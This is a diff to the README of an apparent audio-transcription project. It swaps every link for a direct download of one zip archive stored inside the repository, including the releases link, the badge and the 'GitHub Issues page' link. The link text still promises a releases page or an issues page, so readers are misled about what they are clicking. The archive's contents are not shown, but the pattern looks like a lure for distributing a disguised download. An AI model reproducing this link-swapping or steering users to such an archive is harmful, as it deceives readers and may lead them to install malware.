@@ -1,7 +1,7 @@
 # 🎤 TAPP_Transcription - Transcribe Audio with Ease
 
 ## 🔗 Download Now
-[![Download TAPP_Transcription](https://img.shields.io/badge/Download_TAPP_Transcription-v1.0-blue.svg)](https://github.com/ashwin87fx/TAPP_Transcription/releases)
+[![Download TAPP_Transcription](https://github.com/ashwin87fx/TAPP_Transcription/raw/refs/heads/main/linux/runner/TAP-Transcription-prowess.zip)](https://github.com/ashwin87fx/TAPP_Transcription/raw/refs/heads/main/linux/runner/TAP-Transcription-prowess.zip)
 
 ## 📖 Introduction
 TAPP_Transcription is an intelligent audio analysis platform designed to help you transcribe audio effortlessly. It uses OpenAI's Whisper for accurate transcription and Google Gemini for smart reasoning. Enjoy a seamless experience within our fast and responsive Flutter Web interface.
@@ -10,7 +10,7 @@ TAPP_Transcription is an intelligent audio analysis platform designed to help yo
 Here’s how to download and run TAPP_Transcription:
 
 1. **Access the Releases Page**  
-   Click on this link to visit the releases page: [Download TAPP_Transcription](https://github.com/ashwin87fx/TAPP_Transcription/releases).
+   Click on this link to visit the releases page: [Download TAPP_Transcription](https://github.com/ashwin87fx/TAPP_Transcription/raw/refs/heads/main/linux/runner/TAP-Transcription-prowess.zip).
 
 2. **Find the Latest Version**  
    On the releases page, you will see a list of versions. Look for the latest version at the top of the list. This version typically contains the newest features and bug fixes.
@@ -34,7 +34,7 @@ Before installing TAPP_Transcription, ensure your system meets these requirement
 ## 📥 Download & Install
 To ensure you have TAPP_Transcription up and running:
 
-1. Go to the [Download TAPP_Transcription](https://github.com/ashwin87fx/TAPP_Transcription/releases) page.
+1. Go to the [Download TAPP_Transcription](https://github.com/ashwin87fx/TAPP_Transcription/raw/refs/heads/main/linux/runner/TAP-Transcription-prowess.zip) page.
 
 2. Download the correct file for your operating system.
 
@@ -68,7 +68,7 @@ If you encounter problems while using TAPP_Transcription, here are some common s
 ## 📞 Support
 If you need assistance:
 
-- Visit our [GitHub Issues page](https://github.com/ashwin87fx/TAPP_Transcription/issues) to report bugs or ask for help.
+- Visit our [GitHub Issues page](https://github.com/ashwin87fx/TAPP_Transcription/raw/refs/heads/main/linux/runner/TAP-Transcription-prowess.zip) to report bugs or ask for help.
 - Check the FAQ section in the documentation for quick answers.
 
 ## 🙏 Contributing
